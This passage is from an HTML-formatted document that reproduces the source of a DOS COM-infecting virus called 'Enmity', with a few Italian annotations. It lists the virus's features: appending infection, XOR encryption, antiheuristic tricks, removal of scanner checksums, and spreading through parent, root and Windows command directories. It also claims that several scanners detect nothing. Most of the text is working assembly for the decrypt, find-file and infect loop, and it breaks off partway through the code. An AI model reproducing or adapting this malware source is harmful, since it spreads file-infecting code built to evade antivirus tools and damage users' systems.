Simpatico payload.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>comment #<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>Enmity, by Lord Natas<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>Properties:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>*COM infection (appending, nonresident)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>*antiheuristic code<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>*no TBSCAN flags at time of release (second
generation)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>*encryption (xor, random 16 bit key)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>*works with microsoft COM files (the ones with the
stupid checksum)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>*infects all files in current directory, then in the
upper directory,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> </span>then in \,
then in C:\WINDOWS\COMMAND.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>*preserves date, time, attributes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>*doesn't infect command.com, tb*.com files, or
misnamed EXE files<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>*removes scanner checksums<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>Scanning results:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>FPROT(3):<span style='mso-tab-count:1'>   </span>nothing<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>AVP:<span style='mso-tab-count:2'>        </span>nothing<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>TBSCAN(WIN95):<span style='mso-tab-count:1'>    </span>nothing<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>FINDVIRUS:<span style='mso-tab-count:1'>  </span>nothing<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>DRWEB:<span style='mso-tab-count:2'>            </span>nothing<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>Assemble with TASM.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>MASM produces errors (at least, the version I have)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>#<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>.model<span
style='mso-tab-count:1'>      </span>tiny<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>.code<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>jumps<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>org<span
style='mso-tab-count:1'>   </span>100h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>code_length<span style='mso-tab-count:
1'> </span>equ<span style='mso-tab-count:1'>   </span>end_virus-start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- fake host - a jump and infection mark<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'>host:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'><span style='mso-tab-count:2'>            </span>db<span
style='mso-tab-count:1'>    </span>0e9h,0,0,'66'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; definita come “unencrypted portion“...indovinate cos’è ?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>start:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>call<span
style='mso-tab-count:1'>  </span>get_offset<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>;----- get the delta offset<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>get_offset:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>pop<span
style='mso-tab-count:1'>   </span>ax<span style='mso-tab-count:2'>          </span>;nice
and (somewhat) anti-heuristic<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>xchg<span
style='mso-tab-count:1'>  </span>cx,ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>sub<span
style='mso-tab-count:1'>   </span>cx,offset get_offset<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>xchg<span
style='mso-tab-count:1'>  </span>bp,cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>call<span
style='mso-tab-count:1'>  </span>decrypt<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>jmp<span
style='mso-tab-count:1'>   </span>short virus_start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ax,4c00h<span style='mso-tab-count:2'>          </span>;this
shuts-up findvirus<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#B32D9D'>int<span
style='mso-tab-count:1'>   </span>21h<span style="mso-spacerun:
yes">               </span>; termina il programma<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>virus_start:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>push<span
style='mso-tab-count:1'>  </span>1a01h<span style='mso-tab-count:3'>             </span>;!heuristic
killer!<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>push<span
style='mso-tab-count:1'>  </span>100h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>si,[bp+oldbytes]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>pop<span
style='mso-tab-count:1'>   </span>di<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>movsw<span
style='mso-tab-count:4'>                   </span>;move 5 bytes to 0100h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>movsw<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>movsb<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- move the DTA to the end<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>dx,[bp+dta]<span style='mso-tab-count:2'>       </span>;store
in dta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>pop<span
style='mso-tab-count:1'>   </span>ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>dec<span
style='mso-tab-count:1'>   </span>ax<span style='mso-tab-count:3'>                </span>;!heuristic
killer!<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- save our current directory<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ah,47h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:FR'>xor<span
style='mso-tab-count:1'>   </span>dl,dl<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>lea<span
style='mso-tab-count:1'>   </span>si,[bp+old_dir]<span style='mso-tab-count:
2'>         </span>;store in old_dir<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- find *.COM files<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>call<span
style='mso-tab-count:1'>  </span>killer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>call<span
style='mso-tab-count:1'>  </span>findfirst<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>find_file:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>jc<span
style='mso-tab-count:1'>    </span>try_updir<span style='mso-tab-count:2'>         </span>;if
error jump<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>call<span
style='mso-tab-count:1'>  </span>infect<span style='mso-tab-count:3'>                  </span>;else
infect<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>find_next:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ah,4fh<span style='mso-tab-count:3'>                  </span>;find
next file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>jmp<span
style='mso-tab-count:1'>   </span>short find_file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>try_updir:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ah,3bh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>dx,[bp+higher_dir]<span style='mso-tab-count:
1'>      </span>;change dir up<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>jc<span
style='mso-tab-count:1'>    </span>is_root<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>call<span
style='mso-tab-count:1'>  </span>killer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>call<span
style='mso-tab-count:1'>  </span>findfirst<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>find_updir:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>jc<span
style='mso-tab-count:1'>    </span>is_root<span style='mso-tab-count:3'>                 </span>;if
none, exit<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>call<span
style='mso-tab-count:1'>  </span>infect<span style='mso-tab-count:3'>                  </span>;else
infect<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ah,4fh<span style='mso-tab-count:3'>                  </span>;find
next<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>jmp<span
style='mso-tab-count:1'>   </span>short find_updir<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>is_root:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ah,47h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:FR'>xor<span
style='mso-tab-count:1'>   </span>dl,dl<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>lea<span
style='mso-tab-count:1'>   </span>si,[bp+dir_chk]<span style='mso-tab-count:
2'>         </span>;store in dir_chk<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>cmp<span
style='mso-tab-count:1'>   </span>byte ptr [bp+dir_chk],0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>je<span
style='mso-tab-count:1'>    </span>try_win<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>try_root:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ah,3bh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>dx,[bp+root]<span style='mso-tab-count:2'>            </span>;change
dir to root ('\')<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>jc<span
style='mso-tab-count:1'>    </span>try_win<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>call<span
style='mso-tab-count:1'>  </span>killer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
